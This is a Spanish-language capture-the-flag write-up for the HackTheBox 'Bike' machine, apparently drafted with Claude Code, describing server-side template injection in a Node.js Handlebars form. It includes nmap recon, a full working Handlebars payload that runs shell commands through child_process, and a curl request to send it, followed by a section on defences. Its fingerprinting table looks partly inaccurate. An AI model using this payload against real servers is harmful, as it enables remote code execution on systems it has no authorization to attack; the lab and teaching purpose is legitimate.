---
title: Bike (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, ssti, nodejs, handlebars, web, rce]
type: nota
status: en-progreso
source: claude-code
aliases: [Bike HTB, SSTI Handlebars, HTB Bike]
---

# Bike — HTB Starting Point (Tier 1)

**Tier 1 · SO: Linux · Dificultad: Very Easy · Skills: SSTI, fingerprint de motor de plantillas, RCE**

> HTB Starting Point es un laboratorio completamente legal y autorizado; toda actividad aquí descrita se realiza en un entorno controlado con fines educativos.

Bike expone una aplicación web Node.js (Express + Handlebars) con un formulario de email. El vector es SSTI (Server-Side Template Injection): el servidor renderiza el input del usuario como plantilla, permitiendo ejecución de código arbitrario en el servidor.

---

## Objetivo

Explotar una vulnerabilidad SSTI en Handlebars para obtener RCE y leer la flag del sistema.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría: escaneo de puertos y fingerprint de servicio**

```bash
nmap -sC -sV -oN bike.nmap <IP>
```

Resultado relevante:
- Puerto **22/tcp** — SSH (OpenSSH)
- Puerto **80/tcp** — HTTP (Node.js/Express)

El servidor web es el vector de ataque. El puerto 22 puede servir más adelante si obtenemos credenciales, pero no es necesario para esta máquina.

---

## Enumeracion

**Categoría: identificación de superficie de ataque y fingerprint del motor de plantillas**

Navegar a `http://<IP>/` muestra un formulario que solicita una dirección de email. El servidor devuelve el valor introducido en la página de respuesta, lo que sugiere que el input se procesa (y posiblemente se renderiza) en el backend.

### Paso 1 — Probar si hay evaluación de plantilla

Enviar el payload de detección universal de SSTI:

```bash
{{7*7}}
```

Si el servidor devuelve `49` en lugar de `{{7*7}}`, confirma que el input se está evaluando como plantilla (el motor ejecutó la expresión matemática).

### Paso 2 — Identificar el motor

Los motores responden diferente a payloads específicos. Para Node.js, los candidatos habituales son Handlebars, Pug y EJS.

| Payload        | Handlebars responde | Pug responde |
|----------------|---------------------|--------------|
| `{{7*7}}`      | 49                  | error/raw    |
| `{{7*'7'}}`    | error de tipo       | 49           |

Si `{{7*7}}` da `49` y `{{7*'7'}}` da error de tipo, el motor es **Handlebars**.

---

## Acceso inicial (foothold)

**Categoría: SSTI con RCE en Handlebars (Node.js)**

Handlebars no tiene un helper `eval` directo, pero se puede escalar a RCE accediendo al contexto del proceso de Node a través del prototipo de objeto. El payload estándar usa `require` vía la cadena de prototipos:

```bash
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

> Ajusta `'id'` por el comando que necesites. Contra la máquina en vivo puede ser necesario URL-encodear el payload si se envía por GET; si va por POST en body `application/x-www-form-urlencoded`, envíalo tal cual o mediante Burp/curl.

Ejemplo con curl (POST):

```bash
curl -s -X POST http://<IP>/ \
  --data-urlencode 'email={{#with "s" as |string|}}...{{/with}}'
```

Una vez confirmado RCE, leer la flag:

```bash
# Cambiar 'id' por:
cat /root/flag.txt
# o según indique la máquina:
cat /flag.txt
```

---

## Escalada de privilegios

No requiere privesc: la aplicación Node.js corre con privilegios suficientes para leer la flag directamente mediante RCE. La flag se obtiene con el comando `cat` dentro del payload SSTI.

---

## Flags

| Flag      | Ruta típica         | Notas                                      |
|-----------|---------------------|--------------------------------------------|
| Flag única | `/root/flag.txt` o `/flag.txt` | Bike (Tier 1) suele tener una sola flag; confirmar ruta con `ls /` dentro del payload |

Usa el placeholder `<flag>` al anotarla si aún no la has obtenido en vivo.

---

## Patron y teoria

**Esta es la sección más importante.**

### El patrón: SSTI (Server-Side Template Injection)

**Categoría de vulnerabilidad:** Inyección — el input del usuario se interpreta como código de plantilla en lugar de datos.

**Cómo ocurre:**

```
[Input usuario] → [Motor de plantillas] → [Renderizado HTML]
                        ↑
              El motor evalúa el input como instrucción,
              no como dato. Si el motor puede llamar a
              funciones del runtime, hay RCE.
```

El flujo correcto sería:

```
[Input usuario] → [Escapado/dato] → [Motor de plantillas con contexto fijo] → [HTML]
```

**Fingerprint del motor** — el primer paso es siempre identificar QUÉ motor está corriendo antes de lanzar exploits ciegos. Distintos motores (Jinja2, Twig, Handlebars, Pug, EJS, FreeMarker) tienen sintaxis y capacidades distintas. Un payload de Jinja2 no funciona en Handlebars y viceversa.

**Escalada a RCE en Handlebars** — Handlebars está diseñado como motor "sin lógica" (logic-less), pero su sandbox es bypasseable porque permite acceder al prototipo de objetos JavaScript. Desde ahí se llega a `Function` constructor o a `require`, que abre la puerta al sistema operativo.

### Cómo se defiende / cómo diseñar para evitarlo (clave dev/purple team)

1. **Nunca concatenes input de usuario en una cadena de plantilla.** La raíz del problema es hacer esto:
   ```javascript
   // MAL — SSTI guaranteed
   const html = template.compile(`Hola ${req.body.email}`)(context);

   // BIEN — el input va como dato, no como plantilla
   const html = template.compile(`Hola {{email}}`)(context);
   //                                              ^
   //                              'email' viene del contexto controlado
   ```

2. **Sanitiza y valida el tipo esperado.** Un campo email solo debería aceptar direcciones email válidas (regex + validación semántica). Rechaza en el servidor cualquier valor que no pase la validación.

3. **Usa el sandbox del motor correctamente.** Handlebars tiene opciones de sandbox; Pug y otros también. Actívalos y no los desactives por comodidad.

4. **Principio de mínimo privilegio para el proceso.** Si el proceso Node.js corriera como usuario sin privilegios, el RCE quedaría contenido. Corre tu app como usuario dedicado sin acceso a `/root`.

5. **Content Security Policy (CSP) y WAF** son capas adicionales, pero no reemplazan la corrección en origen.

**Patrón general que se repite:** toda vez que el servidor mezcla datos de usuario con código (templates, SQL, comandos de shell, eval), el resultado es inyección. La defensa siempre es la misma: separar datos de instrucciones.

Ver también: [[04-seguridad-web-owasp]] — OWASP A03:2021 Injection.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]]
